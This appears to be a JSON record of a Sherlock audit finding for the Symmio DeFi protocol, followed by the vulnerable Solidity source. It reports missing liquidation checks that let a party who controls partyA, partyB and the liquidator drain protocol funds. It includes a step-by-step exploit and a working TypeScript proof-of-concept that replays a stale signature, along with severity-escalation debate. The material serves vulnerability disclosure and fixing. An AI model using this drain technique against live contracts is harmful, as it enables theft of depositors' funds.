{
  "Title": "M-8: Some actions are allowed on partyB when corresponding partyA is liquidated allowing to steal all protocol funds",
  "Content": "# Issue M-8: Some actions are allowed on partyB when corresponding partyA is liquidated allowing to steal all protocol funds \n\nSource: https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/189 \n\n## Found by \npanprog\n## Summary\n\n`deallocateForPartyB` function doesn't check if partyA is liquidated, allowing partyB to deallocate funds when partyA liquidation process is not finished:\n\nhttps://github.com/sherlock-audit/2023-06-symmetrical/blob/main/symmio-core/contracts/facets/Account/AccountFacet.sol#L84-L91\n\n`transferAllocation` function doesn't check if partyA is liquidated either:\n\nhttps://github.com/sherlock-audit/2023-06-symmetrical/blob/main/symmio-core/contracts/facets/Account/AccountFacetImpl.sol#L71-L106\n\nEither of these functions allows to deallocate (or transfer, then deallocate) funds for partyB when partyA liquidation is not yet finished. Coupled with the ability for liquidator to choose which partyA positions to liquidate, this allows to steal all protocol funds.\n\n## Vulnerability Detail\n\nLiquidating partyA is a multi-step process. First, `liquidatePartyA` is called to mark the start of liquidation process. Then, liquidator has to set symbol prices, liquidate pending quotes and finally call `liquidatePositionsPartyA` (possibly multiple times) with liquidated positions. Each position, which is liquidated in the `liquidatePositionsPartyA` function increases `allocatedBalance` of partyB if the position is in a loss for partyA (profit for partyB).\n\nThe bug reported here allows for partyB to deallocate this increased `allocatedBalance` while partyA liquidation is still in process. The scenario to exploit this bug is as following:\n\n1. User has to control partyA, partyB and liquidator.\n2. Open 2 large opposite positions between partyA and partyB such that one of them is in a high loss and the other in the same/similar profit (easy to do via  openPrice which is far away from current market price, since both partyA and partyB are controlled by the same user).\n3. Make partyA liquidatable (many ways to do this: for example, opposite positions can have slightly different size with minimal locked balances, so that when the price moves, this disparency can make partyA liquidatable)\n4. Call `liquidatePartyA` and `setSymbolsPrice` (there is no bad debt, because 1 position is in a big loss, the other position in a big profit, but their sum is in a small loss, which is covered by allocatd balance)\n5. Sign `singleUpnlSig` for partyB at this time (partyB is in a small profit)\n6. User-controlled liquidator calls `liquidatePositionsPartyA` with id of only the position which is in a loss for partyA, profit for partyB. This call increases partyB allocated balance by a very high profit of the position. Moreover, this action doesn't change partyB's nonce, so previous partyB signature is still valid.\n7. At this time partyB has large inflated allocatedBalance and the same big loss, however signature for when partyB was in a small profit is still valid, because party B nonce is the same (position liquidation didn't change it). Use that older signature to sign `deallocateForPartyB`, deallocating inflated balance (which can easily be higher than total protocol deposited funds).\n8. Withdraw deallocated balance for partyB. At this point all protocol funds are stolen.\n\nThe other instances where there is no check if party is liquidated:\n\n1. partyA `requestToClosePosition` (it checks if quote is liquidated, but doesn't check for neither partyA nor partyB liquidation status)\n2. partyB `fillCloseRequest` (same as `requestToClosePosition`)\n3. partyA `deallocate` checks for partyA liquidation status, but can't check for partyB liquidation status, because there can be multiple partyB's. This is reported as a separate bug, because the core problem (muon app signing incorrect upnl) and solution for that one is different.\n\n## Impact\n\nAll protocol funds can be stolen if a user can control partyA, partyB and liquidator. Since partyB and liquidator roles are supposed to be easy to get, this means that most users are able to easily steal all protocol funds.\n\n## Code Snippet\n\nAdd this to any test, for example to `ClosePosition.behavior.ts`.\n\n```ts\nimport { getDummyPriceSig, getDummySingleUpnlAndPriceSig, getDummyQuotesPriceSig, getDummySingleUpnlSig } from \"./utils/SignatureUtils\";\n\nit(\"Steal all funds via inflated PartyB allocated balance off picky partyA position liquidation\", async function () {\n  const context: RunContext = this.context;\n\n  this.protocol_allocated = decimal(1000);\n\n  this.user_allocated = decimal(590);\n  this.hedger_allocated = decimal(420);\n\n  // some unsuspecting user deposits 1000 into protocol (but doesn't allocate it)\n  this.user2 = new User(this.context, this.context.signers.user);\n  await this.user2.setup();\n  await this.user2.setBalances(this.protocol_allocated, this.protocol_allocated, 0);\n\n  // exploiter user controls partyA, partyB and liquidator\n  this.user = new User(this.context, this.context.signers.user);\n  await this.user.setup();\n  await this.user.setBalances(this.user_allocated, this.user_allocated, this.user_allocated);\n\n  this.hedger = new Hedger(this.context, this.context.signers.hedger);\n  await this.hedger.setup();\n  await this.hedger.setBalances(this.hedger_allocated, this.hedger_allocated);\n\n  this.liquidator = new User(this.context, this.context.signers.liquidator);\n  await this.liquidator.setup();\n\n  // open 2 opposite direction positions with user-controlled hedger to exploit them later\n  // (positions with slightly different sizes so that at some point the hedger can be liquidated)\n  await this.user.sendQuote(limitQuoteRequestBuilder()\n    .quantity(decimal(11000))\n    .price(decimal(1))\n    .cva(decimal(100)).lf(decimal(50)).mm(decimal(40))\n    .build()\n  );\n  await this.hedger.lockQuote(1, 0, decimal(2, 16));\n  await this.hedger.openPosition(1, limitOpenRequestBuilder().filledAmount(decimal(11000)).openPrice(decimal(1)).price(decimal(1)).build());\n\n  await this.user.sendQuote(limitQuoteRequestBuilder()\n    .positionType(PositionType.SHORT)\n    .quantity(decimal(10000))\n    .price(decimal(1))\n    .cva(decimal(100)).lf(decimal(50)).mm(decimal(40))\n    .build()\n  );\n  await this.hedger.lockQuote(2, 0, decimal(2, 16));\n  await this.hedger.openPosition(2, limitOpenRequestBuilder().filledAmount(decimal(10000)).openPrice(decimal(1)).price(decimal(1)).build());\n\n  var info = await this.user.getBalanceInfo();\n  console.log(\"partyA allocated: \" + info.allocatedBalances / 1e18 + \" locked: \" + info.totalLocked/1e18 + \" pendingLocked: \" + info.totalPendingLocked / 1e18);\n  var info = await this.hedger.getBalanceInfo(this.user.getAddress());\n  console.log(\"partyB allocated: \" + info.allocatedBalances / 1e18 + \" locked: \" + info.totalLocked/1e18 + \" pendingLocked: \" + info.totalPendingLocked / 1e18);\n\n  // price goes to 0.9, so partyA is in a loss of -100 and becomes liquidatable\n  // user now exploits the bug by liquidating partyA\n  await context.liquidationFacet.connect(this.liquidator.signer).liquidatePartyA(\n    this.user.signer.address,\n    await getDummySingleUpnlSig(decimal(-100)),\n  );\n\n  await context.liquidationFacet.connect(this.liquidator.signer).setSymbolsPrice(\n      this.user.signer.address,\n      await getDummyPriceSig([1], [decimal(9, 17)], decimal(-100), decimal(1100)),\n    );\n\n  // get partyB upnl signature before partyA position is liquidated (at which time partyB has upnl of +100)\n  var previousSig = await getDummySingleUpnlSig(decimal(100));\n\n  // liquidate only quote 1 (temporarily inflating balance of controlled partyB)\n  await context.liquidationFacet.connect(this.liquidator.signer).liquidatePositionsPartyA(\n    this.user.signer.address,\n    [1]\n  );\n\n  var info = await this.hedger.getBalanceInfo(this.user.getAddress());\n  console.log(\"after liquidation of partyA: partyB allocated: \" + info.allocatedBalances / 1e18 + \" locked: \" + info.totalLocked/1e18 + \" pendingLocked: \" + info.totalPendingLocked / 1e18);\n\n  // deallocate partyB with previous signature (before partyA's position is liquidated)\n  // (current partyB upnl is -1100)\n  await context.accountFacet.connect(this.hedger.signer).deallocateForPartyB(decimal(1530), this.user.getAddress(), previousSig);\n  // alternatively use transferAllocation\n  //await context.accountFacet.connect(this.hedger.signer).transferAllocation(decimal(1530), this.user.getAddress(), this.user2.getAddress(), previousSig);\n  //await context.accountFacet.connect(this.hedger.signer).deallocateForPartyB(decimal(1530), this.user2.getAddress(), previousSig);\n\n  var balance = await context.viewFacet.balanceOf(this.hedger.getAddress());\n  console.log(\"PartyB balance to withdraw: \" + balance/1e18);\n  var info = await this.hedger.getBalanceInfo(this.user.getAddress());\n  console.log(\"partyB allocated: \" + info.allocatedBalances / 1e18 + \" locked: \" + info.totalLocked/1e18 + \" pendingLocked: \" + info.totalPendingLocked / 1e18);\n  await time.increase(300);\n  await context.accountFacet.connect(this.hedger.signer).withdraw(balance);\n\n  var balance = await context.collateral.balanceOf(this.hedger.getAddress());\n  console.log(\"Withdrawn partyB balance: \" + balance/1e18);\n  var balance = await context.collateral.balanceOf(context.diamond);\n  console.log(\"Protocol balance: \" + balance/1e18 + \" (less than unsuspected user deposited)\");\n\n  // try to withdraw unsuspected user's balance\n  await expect(context.accountFacet.connect(this.user2.signer).withdraw(this.protocol_allocated))\n    .to.be.revertedWith(\"ERC20: transfer amount exceeds balance\");\n\n  console.log(\"User who only deposited 1000 is unable to withdraw his deposit because partyB has stolen his funds\");\n\n});\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd require's (or modifiers) to check that neither partyA nor partyB of the quote are liquidated in the following functions:\n1. `deallocateForPartyB`\n2. `transferAllocation`\n3. `requestToClosePosition`\n4. `fillCloseRequest`\n\n\n\n## Discussion\n\n**ctf-sec**\n\nComment from senior watson:\n\nPoint 1 - As per the impact of the report, it mentioned the following:\n\nAll protocol funds can be stolen if a user can control partyA, partyB and liquidator. Since partyB and liquidator roles are supposed to be easy to get, this means that most users are able to easily steal all protocol funds.\n\nThe PartyB has to be vetted and whitelisted by protocol. The liquidator role also needs to be granted by the protocol. Only PartyA is public. It is challenging for an attacker to gain control of all three (3) roles in order to carry out the attack mentioned in the report. Thus, it does not meet the requirement of a high-risk rating\n\n**panprog**\n\nEscalate\n\nThis should be high, not medium.\n\n1. Liquidator is **not trusted**, refer to contest Q&A:\n> Are there any additional protocol roles? If yes, please explain in detail:\nMUON_SETTER_ROLE: Can change settings of the Muon Oracle.\nSYMBOL_MANAGER_ROLE: Can add, edit, and remove markets, as well as change market settings like fees and minimum acceptable position size.\nPAUSER_ROLE: Can pause all system operations.\nUNPAUSER_ROLE: Can unpause all system operations.\nPARTY_B_MANAGER_ROLE: Can add new partyBs to the system.\nLIQUIDATOR_ROLE: Can liquidate users.\nSETTER_ROLE: Can change main system settings.\nNote: All roles are trusted except for LIQUIDATOR_ROLE.\n\n2. Liquidator role is supposed to be easy to get, even if it might require some funds deposit, but since this bug allows to steal **ALL** protocol funds deposited, this deposit can easily be forfeited. Refer to [this comment](https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/231#issuecomment-1640368252):\n\n> In the current system setup, we have established a role for liquidators. To give them this role, we might require an external contract in which they are obliged to lock a certain amount of money. This serves as a guarantee against any potential system sabotage or incomplete liquidation they may commit. If they fail to fulfill their role appropriately, they would face penalties.\n\n4. PartyB is expected to be easy to get for any user later on, even though it's currently only for select users. Refer to discord reply:\n> ideally anyone can become a PartyB, \nbut it also requires you to stream your quotes to a frontend (so users can see them, and frontends can create a payload for the user to send it onchain), \nand be able to accept trades when they come in.\n\n> so it definitely requires some software architecture, \nwe will provide examples for this in combination with the SDK probably in Q4 to open up the process and make it semi-permissionless\n\n> until then integrations are with selected players and MarketMakers\n\nAs described above, both liquidator and partyB roles will be easy to get, so the scenario described is easy to achieve and the impact (all protocol funds stolen) makes it possible to ignore all possible deposits required to obtain these roles. \n\nAs such, this should be high.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This should be high, not medium.\n> \n> 1. Liquidator is **not trusted**, refer to contest Q&A:\n> > Are there any additional protocol roles? If yes, please explain in detail:\n> MUON_SETTER_ROLE: Can change settings of the Muon Oracle.\n> SYMBOL_MANAGER_ROLE: Can add, edit, and remove markets, as well as change market settings like fees and minimum acceptable position size.\n> PAUSER_ROLE: Can pause all system operations.\n> UNPAUSER_ROLE: Can unpause all system operations.\n> PARTY_B_MANAGER_ROLE: Can add new partyBs to the system.\n> LIQUIDATOR_ROLE: Can liquidate users.\n> SETTER_ROLE: Can change main system settings.\n> Note: All roles are trusted except for LIQUIDATOR_ROLE.\n> \n> 2. Liquidator role is supposed to be easy to get, even if it might require some funds deposit, but since this bug allows to steal **ALL** protocol funds deposited, this deposit can easily be forfeited. Refer to [this comment](https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/231#issuecomment-1640368252):\n> \n> > In the current system setup, we have established a role for liquidators. To give them this role, we might require an external contract in which they are obliged to lock a certain amount of money. This serves as a guarantee against any potential system sabotage or incomplete liquidation they may commit. If they fail to fulfill their role appropriately, they would face penalties.\n> \n> 4. PartyB is expected to be easy to get for any user later on, even though it's currently only for select users. Refer to discord reply:\n> > ideally anyone can become a PartyB, \n> but it also requires you to stream your quotes to a frontend (so users can see them, and frontends can create a payload for the user to send it onchain), \n> and be able to accept trades when they come in.\n> \n> > so it definitely requires some software architecture, \n> we will provide examples for this in combination with the SDK probably in Q4 to open up the process and make it semi-permissionless\n> \n> > until then integrations are with selected players and MarketMakers\n> \n> As described above, both liquidator and partyB roles will be easy to get, so the scenario described is easy to achieve and the impact (all protocol funds stolen) makes it possible to ignore all possible deposits required to obtain these roles. \n> \n> As such, this should be high.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**xiaoming9090**\n\nEscalate\n\nTo carry out the attack mentioned in the report, the malicious user needs to gain control of all three (3) roles, which are PartyA, PartyB, and Liquidator roles, to carry out the attack. There are several measures present within the protocol that make such an event unlikely.\n\nPartyB (Hedger) and Liquidator roles are in fact not easy to obtain from the protocol, and they cannot be attained without explicit authorization from the protocol team. It will only be considered easy to obtain if they are permissionless, where anyone/anon could register to become a PartyB or Liquidator without being reviewed/vetted by the protocol team.\n\nPartyB and Liquidator roles must be explicitly granted by the protocol team via the `registerPartyB` function and the `grantRole` function, respectively.\n\nIn the current system, to become a PartyB, the Hedgers must be known entities such as market makers with a reputation and identifiable founders, etc, and not open to the general public. Those hedgers/entities have a lot at stake if they engage in malicious actions, which include facing legal consequences. \n\nThe liquidator role is also not open to the general public, and the protocol would vet/review them before granting this role. Approved Liquidators are further required to lock in a certain amount of money, serving as a guarantee against any potential system sabotage.\n\nLastly, it's worth noting that in a real-world context, PartyB and Liquidator roles are typically held by distinct entities. Hence, some degree of collusion - another layer of complexity - would be necessary for the attack to be successful.\n\nGiven the controls in place and the several preconditions required for such an issue to occur, this issue should be considered of Medium severity.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> To carry out the attack mentioned in the report, the malicious user needs to gain control of all three (3) roles, which are PartyA, PartyB, and Liquidator roles, to carry out the attack. There are several measures present within the protocol that make such an event unlikely.\n> \n> PartyB (Hedger) and Liquidator roles are in fact not easy to obtain from the protocol, and they cannot be attained without explicit authorization from the protocol team. It will only be considered easy to obtain if they are permissionless, where anyone/anon could register to become a PartyB or Liquidator without being reviewed/vetted by the protocol team.\n> \n> PartyB and Liquidator roles must be explicitly granted by the protocol team via the `registerPartyB` function and the `grantRole` function, respectively.\n> \n> In the current system, to become a PartyB, the Hedgers must be known entities such as market makers with a reputation and identifiable founders, etc, and not open to the general public. Those hedgers/entities have a lot at stake if they engage in malicious actions, which include facing legal consequences. \n> \n> The liquidator role is also not open to the general public, and the protocol would vet/review them before granting this role. Approved Liquidators are further required to lock in a certain amount of money, serving as a guarantee against any potential system sabotage.\n> \n> Lastly, it's worth noting that in a real-world context, PartyB and Liquidator roles are typically held by distinct entities. Hence, some degree of collusion - another layer of complexity - would be necessary for the attack to be successful.\n> \n> Given the controls in place and the several preconditions required for such an issue to occur, this issue should be considered of Medium severity.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nI would have to agree with senior watson's escalation\n\nConsider that in the contest read me\n\nhttps://audits.sherlock.xyz/contests/85\n\n> Are the admins of the protocols your contracts integrate with (if any) TRUSTED or RESTRICTED?\n\nTRUSTED\n\n> Is the admin/owner of the protocol/contracts TRUSTED or RESTRICTED?\n\nTRUSTED\n\nand \n\n> PARTY_B_MANAGER_ROLE: Can add new partyBs to the system.\n> LIQUIDATOR_ROLE: Can liquidate users.\n\nneeds to be granted by the protocol, recommend consider this issue as a valid medium\n\n**CodingNameKiki**\n\nAdditional information by the sponsor which might be helpful.\n\n<img width=\"666\" alt=\"Screenshot 2023-07-28 at 16 40 20\" src=\"https://github.com/sherlock-audit/2023-06-symmetrical-judging/assets/112419701/d07e6745-7ea3-43a4-9acb-24a9475b7e10\">\n\n\n**MoonKnightDev**\n\nFixed code PR link:\nhttps://github.com/SYMM-IO/symmio-core/pull/10\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nAgree with the points raised in [this escalaiton](https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/189#issuecomment-1653282757). This is a valid medium issue. \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/189/#issuecomment-1653282757): accepted\n- [panprog](https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/189/#issuecomment-1653067933): rejected\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/85",
  "Code": [
    {
      "filename": "symmio-core/contracts/facets/Account/AccountFacet.sol",
      "content": "// SPDX-License-Identifier: SYMM-Core-Business-Source-License-1.1\n// This contract is licensed under the SYMM Core Business Source License 1.1\n// Copyright (c) 2023 Symmetry Labs AG\n// For more information, see https://docs.symm.io/legal-disclaimer/license\npragma solidity >=0.8.18;\n\nimport \"../../utils/Accessibility.sol\";\nimport \"../../utils/Pausable.sol\";\nimport \"./IAccountEvents.sol\";\nimport \"./AccountFacetImpl.sol\";\nimport \"../../storages/GlobalAppStorage.sol\";\n\ncontract AccountFacet is Accessibility, Pausable, IAccountEvents {\n\n    //Party A\n    function deposit(uint256 amount) external whenNotAccountingPaused {\n        AccountFacetImpl.deposit(msg.sender, amount);\n        emit Deposit(msg.sender, msg.sender, amount);\n    }\n\n    function depositFor(address user, uint256 amount) external whenNotAccountingPaused {\n        AccountFacetImpl.deposit(user, amount);\n        emit Deposit(msg.sender, user, amount);\n    }\n\n    function withdraw(uint256 amount) external whenNotAccountingPaused notSuspended(msg.sender) {\n        AccountFacetImpl.withdraw(msg.sender, amount);\n        emit Withdraw(msg.sender, msg.sender, amount);\n    }\n\n    function withdrawTo(\n        address user,\n        uint256 amount\n    ) external whenNotAccountingPaused notSuspended(msg.sender) {\n        AccountFacetImpl.withdraw(user, amount);\n        emit Withdraw(msg.sender, user, amount);\n    }\n\n    function allocate(\n        uint256 amount\n    ) external whenNotAccountingPaused notLiquidatedPartyA(msg.sender) {\n        AccountFacetImpl.allocate(amount);\n        emit AllocatePartyA(msg.sender, amount);\n    }\n\n    function depositAndAllocate(\n        uint256 amount\n    ) external whenNotAccountingPaused notLiquidatedPartyA(msg.sender) {\n        AccountFacetImpl.deposit(msg.sender, amount);\n        uint256 amountWith18Decimals = (amount * 1e18) /\n        (10 ** IERC20Metadata(GlobalAppStorage.layout().collateral).decimals());\n        AccountFacetImpl.allocate(amountWith18Decimals);\n        emit Deposit(msg.sender, msg.sender, amount);\n        emit AllocatePartyA(msg.sender, amountWith18Decimals);\n    }\n\n    function deallocate(\n        uint256 amount,\n        SingleUpnlSig memory upnlSig\n    ) external whenNotAccountingPaused notLiquidatedPartyA(msg.sender) {\n        AccountFacetImpl.deallocate(amount, upnlSig);\n        emit DeallocatePartyA(msg.sender, amount);\n    }\n\n    // PartyB\n    function allocateForPartyB(\n        uint256 amount,\n        address partyA\n    ) public whenNotPartyBActionsPaused notLiquidatedPartyB(msg.sender, partyA) onlyPartyB {\n        AccountFacetImpl.allocateForPartyB(amount, partyA, true);\n        emit AllocateForPartyB(msg.sender, partyA, amount);\n    }\n\n    function depositAndAllocateForPartyB(\n        uint256 amount,\n        address partyA\n    ) external whenNotPartyBActionsPaused onlyPartyB {\n        AccountFacetImpl.depositForPartyB(amount);\n        AccountFacetImpl.allocateForPartyB(amount, partyA, true);\n        emit DepositForPartyB(msg.sender, amount);\n        emit AllocateForPartyB(msg.sender, partyA, amount);\n    }\n\n    function deallocateForPartyB(\n        uint256 amount,\n        address partyA,\n        SingleUpnlSig memory upnlSig\n    ) external whenNotPartyBActionsPaused notLiquidatedPartyB(msg.sender, partyA) onlyPartyB {\n        AccountFacetImpl.deallocateForPartyB(amount, partyA, upnlSig);\n        emit DeallocateForPartyB(msg.sender, partyA, amount);\n    }\n\n    function depositForPartyB(uint256 amount) external whenNotPartyBActionsPaused onlyPartyB {\n        AccountFacetImpl.depositForPartyB(amount);\n        emit DepositForPartyB(msg.sender, amount);\n    }\n\n    function transferAllocation(\n        uint256 amount,\n        address origin,\n        address recipient,\n        SingleUpnlSig memory upnlSig\n    ) external whenNotPartyBActionsPaused {\n        AccountFacetImpl.transferAllocation(amount, origin, recipient, upnlSig);\n        emit TransferAllocation(amount, origin, recipient);\n    }\n}"
    },
    {
      "filename": "symmio-core/contracts/facets/Account/AccountFacetImpl.sol",
      "content": "// SPDX-License-Identifier: SYMM-Core-Business-Source-License-1.1\n// This contract is licensed under the SYMM Core Business Source License 1.1\n// Copyright (c) 2023 Symmetry Labs AG\n// For more information, see https://docs.symm.io/legal-disclaimer/license\npragma solidity >=0.8.18;\n\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport \"../../storages/AccountStorage.sol\";\nimport \"../../storages/GlobalAppStorage.sol\";\nimport \"../../storages/MAStorage.sol\";\nimport \"../../storages/MuonStorage.sol\";\nimport \"../../libraries/LibMuon.sol\";\nimport \"../../libraries/LibAccount.sol\";\n\nlibrary AccountFacetImpl {\n    using SafeERC20 for IERC20;\n\n    function deposit(address user, uint256 amount) internal {\n        GlobalAppStorage.Layout storage appLayout = GlobalAppStorage.layout();\n        IERC20(appLayout.collateral).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 amountWith18Decimals = (amount * 1e18) /\n        (10 ** IERC20Metadata(appLayout.collateral).decimals());\n        AccountStorage.layout().balances[user] += amountWith18Decimals;\n    }\n\n    function withdraw(address user, uint256 amount) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        GlobalAppStorage.Layout storage appLayout = GlobalAppStorage.layout();\n        require(\n            block.timestamp >=\n            accountLayout.withdrawCooldown[msg.sender] + MAStorage.layout().deallocateCooldown,\n            \"AccountFacet: Cooldown hasn't reached\"\n        );\n        uint256 amountWith18Decimals = (amount * 1e18) /\n        (10 ** IERC20Metadata(appLayout.collateral).decimals());\n        accountLayout.balances[msg.sender] -= amountWith18Decimals;\n        IERC20(appLayout.collateral).safeTransfer(user, amount);\n    }\n\n    function allocate(uint256 amount) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        require(\n            accountLayout.allocatedBalances[msg.sender] + amount <=\n            GlobalAppStorage.layout().balanceLimitPerUser,\n            \"AccountFacet: Allocated balance limit reached\"\n        );\n        require(accountLayout.balances[msg.sender] >= amount, \"AccountFacet: Insufficient balance\");\n        accountLayout.partyANonces[msg.sender] += 1;\n        accountLayout.balances[msg.sender] -= amount;\n        accountLayout.allocatedBalances[msg.sender] += amount;\n    }\n\n    function deallocate(uint256 amount, SingleUpnlSig memory upnlSig) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        require(\n            accountLayout.allocatedBalances[msg.sender] >= amount,\n            \"AccountFacet: Insufficient allocated Balance\"\n        );\n        LibMuon.verifyPartyAUpnl(upnlSig, msg.sender);\n        int256 availableBalance = LibAccount.partyAAvailableForQuote(upnlSig.upnl, msg.sender);\n        require(availableBalance >= 0, \"AccountFacet: Available balance is lower than zero\");\n        require(uint256(availableBalance) >= amount, \"AccountFacet: partyA will be liquidatable\");\n\n        accountLayout.partyANonces[msg.sender] += 1;\n        accountLayout.allocatedBalances[msg.sender] -= amount;\n        accountLayout.balances[msg.sender] += amount;\n        accountLayout.withdrawCooldown[msg.sender] = block.timestamp;\n    }\n\n    function transferAllocation(\n        uint256 amount,\n        address origin,\n        address recipient,\n        SingleUpnlSig memory upnlSig\n    ) internal {\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        require(\n            !maLayout.partyBLiquidationStatus[msg.sender][origin],\n            \"PartyBFacet: PartyB isn't solvent\"\n        );\n        require(\n            !maLayout.partyBLiquidationStatus[msg.sender][recipient],\n            \"PartyBFacet: PartyB isn't solvent\"\n        );\n        // deallocate from origin\n        require(\n            accountLayout.partyBAllocatedBalances[msg.sender][origin] >= amount,\n            \"PartyBFacet: Insufficient locked balance\"\n        );\n        LibMuon.verifyPartyBUpnl(upnlSig, msg.sender, origin);\n        int256 availableBalance = LibAccount.partyBAvailableForQuote(\n            upnlSig.upnl,\n            msg.sender,\n            origin\n        );\n        require(availableBalance >= 0, \"PartyBFacet: Available balance is lower than zero\");\n        require(uint256(availableBalance) >= amount, \"PartyBFacet: Will be liquidatable\");\n\n        accountLayout.partyBNonces[msg.sender][origin] += 1;\n        accountLayout.partyBAllocatedBalances[msg.sender][origin] -= amount;\n        // allocate for recipient\n        accountLayout.partyBNonces[msg.sender][recipient] += 1;\n        accountLayout.partyBAllocatedBalances[msg.sender][recipient] += amount;\n    }\n\n    function depositForPartyB(uint256 amount) internal {\n        IERC20(GlobalAppStorage.layout().collateral).safeTransferFrom(\n            msg.sender,\n            address(this),\n            amount\n        );\n        uint256 amountWith18Decimals = (amount * 1e18) /\n        (10 ** IERC20Metadata(GlobalAppStorage.layout().collateral).decimals());\n        AccountStorage.layout().balances[msg.sender] += amountWith18Decimals;\n    }\n\n    function allocateForPartyB(uint256 amount, address partyA, bool increaseNonce) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n        require(accountLayout.balances[msg.sender] >= amount, \"PartyBFacet: Insufficient balance\");\n        require(\n            !MAStorage.layout().partyBLiquidationStatus[msg.sender][partyA],\n            \"PartyBFacet: PartyB isn't solvent\"\n        );\n        if (increaseNonce) {\n            accountLayout.partyBNonces[msg.sender][partyA] += 1;\n        }\n        accountLayout.balances[msg.sender] -= amount;\n        accountLayout.partyBAllocatedBalances[msg.sender][partyA] += amount;\n    }\n\n    function deallocateForPartyB(\n        uint256 amount,\n        address partyA,\n        SingleUpnlSig memory upnlSig\n    ) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        require(\n            accountLayout.partyBAllocatedBalances[msg.sender][partyA] >= amount,\n            \"PartyBFacet: Insufficient locked balance\"\n        );\n        LibMuon.verifyPartyBUpnl(upnlSig, msg.sender, partyA);\n        int256 availableBalance = LibAccount.partyBAvailableForQuote(\n            upnlSig.upnl,\n            msg.sender,\n            partyA\n        );\n        require(availableBalance >= 0, \"PartyBFacet: Available balance is lower than zero\");\n        require(uint256(availableBalance) >= amount, \"PartyBFacet: Will be liquidatable\");\n\n        accountLayout.partyBNonces[msg.sender][partyA] += 1;\n        accountLayout.partyBAllocatedBalances[msg.sender][partyA] -= amount;\n        accountLayout.balances[msg.sender] += amount;\n        accountLayout.withdrawCooldown[msg.sender] = block.timestamp;\n    }\n}"
    }
  ]
}